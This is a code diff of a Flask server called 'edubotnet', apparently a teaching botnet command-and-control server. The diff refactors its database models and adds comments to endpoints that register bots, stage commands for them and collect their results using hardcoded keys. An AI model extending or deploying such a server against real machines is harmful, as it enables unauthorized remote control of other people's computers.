@@ -2,6 +2,9 @@ from flask import Flask, url_for, request, redirect, jsonify, render_template, s
 from flask_sqlalchemy import SQLAlchemy
 from datetime import datetime  
 
+from models import Bot
+from models import Command
+
 app = Flask(__name__)
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///edubotnet.sqlite3'
 db = SQLAlchemy(app)
@@ -10,92 +13,6 @@ FIRSTCONTACTKEY = 'firstcontact'
 # TODO: Change the register key to change dynamically 
 REGISTERKEY = 'registerkey'
 MASTERKEY = 'masterkey'
-
-"""
-def returnjson(*arg):
-    # If the number of parameters are even number
-    if len(arg) % 2 != 0:
-        return '[-] Wrong number of parameters!!!'
-
-    else:
-        return jsonify({})
-"""
-
-class Bot(db.Model):
-    #__tablename__ = 'bots'
-    id = db.Column('bot_id', db.Integer, primary_key=True)
-    ip = db.Column(db.String(128))
-    os = db.Column(db.String(128))
-    # cmds is a "list" of "Command" Model. The cmds and the bot_id from Command Model 
-    # shows the one-to-many foreign key relationship between two tables. 
-    cmds = db.relationship('Command', backref='bot', lazy=True)
-
-    #TODO: Implement 'bot_unique_key' for authentication? 
-    #unique_key = db.Column(db.String(128), default=<random_hash_created>)
-
-    def __init__(self, ip, os):
-        self.ip = ip 
-        self.os = os
-        self.cmds = []
-
-    def get_id(self):
-        return self.id
-
-    def get_ip(self):
-        return self.ip
-
-    def get_os(self):
-        return self.os
-
-    def get_info(self):
-        info = 'Bot[' + str(self.id) + '] IP: ' + self.ip + ' OS: ' + self.os
-        return info
-
-    def get_commands(self):
-        result = '' 
-        i = 0 
-        for command in self.cmds:
-            tmp = '[' + str(i) +'] ' + command.cmd + '\n'
-            result += tmp 
-            i+=1 
-
-        return result 
-
-    def jsonbot(self):
-        # TODO: Create a function which returns a jsonify version of the bot information 
-        pass 
-
-class Command(db.Model):
-    id = db.Column('cmd_id', db.Integer, primary_key=True)
-    cmd = db.Column(db.String(128))
-    result = db.Column(db.String(500))
-    bot_id = db.Column(db.Integer, db.ForeignKey('bot.bot_id'))
-    timestamp = db.Column(db.String(50)) 
-    latest = db.Column(db.Boolean, default=False)
-
-    def __init__(self, cmd, bot_id, bot_ip):
-        self.cmd = cmd 
-        self.bot_id = bot_id 
-        self.bot_ip = bot_ip 
-        self.timestamp = str(datetime.now())
-        self.latest = False
-
-    def set_latest_true(self):
-        self.latest = True
-
-    def set_latest_false(self):
-        self.latest = False 
-
-    def set_result(self, result):
-        self.result = result 
-
-    def get_info(self):
-        info = '[Command Info] [' + self.timestamp + '] Bot_id: ' + str(self.bot_id) + ' Command Issued: ' + self.cmd
-        result = self.result 
-
-        return '\n'.join([info, result])
-
-    #def pushCommand(self)
 
 
 def init_db():
@@ -144,11 +61,11 @@ def register():
     Description: Register a new bot to the server 
 
     [POST] 
-        - (str) registerkey = Register key that is needed for the registration process. 
+        - registerkey = Register key that is needed for the registration process. 
         The key could be obtained through the firstcontact. 
 
-        - (str) ip = IP address of the bot 
-        - (str) os = OS type (Nix/Windows) of the bot 
+        - ip = IP address of the bot 
+        - os = OS type (Nix/Windows) of the bot 
     """
     if request.method != 'POST':
         return jsonify({'error': 'wrong HTTP method'})
@@ -230,10 +147,7 @@ def botpush(bot_ip):
         if cmd is None:
             return jsonify({'error': 'cmd is required'})
 
-        #cmd = Command(cmd, bot_ip)
-
         # Query and get the bot which has the bot_ip, and then append the command to it 
-
         query_bot = Bot.query.filter_by(ip=bot_ip).first()
         cmd = Command(cmd, query_bot.id, bot_ip)
 
@@ -242,6 +156,8 @@ def botpush(bot_ip):
                 query_bot.cmds.append(cmd)
                 db.session.add(cmd)
                 db.session.commit()
+
+                print("[DEBUG] Command staged")
 
                 return jsonify({'result': 'Command staged'})
 
@@ -317,8 +233,8 @@ def botresult(bot_ip):
         return jsonify({'error': 'body cannot be empty'})
 
     try:
+        # If a bot is visiting the endpoint, submit the result into the database 
         if 'registerkey' in data:
-            # TODO: Do the bot thing~ get data['result'] and push it into command
             if data['registerkey'] == REGISTERKEY:
                 result = data['result']
 
@@ -331,6 +247,7 @@ def botresult(bot_ip):
                 # This needs to be changed 
                 return result
 
+        # If a master is visiting the endpoint, return the result to the master 
         elif 'masterkey' in data:
             try:
                 query_bot = Bot.query.filter_by(ip=bot_ip).first()
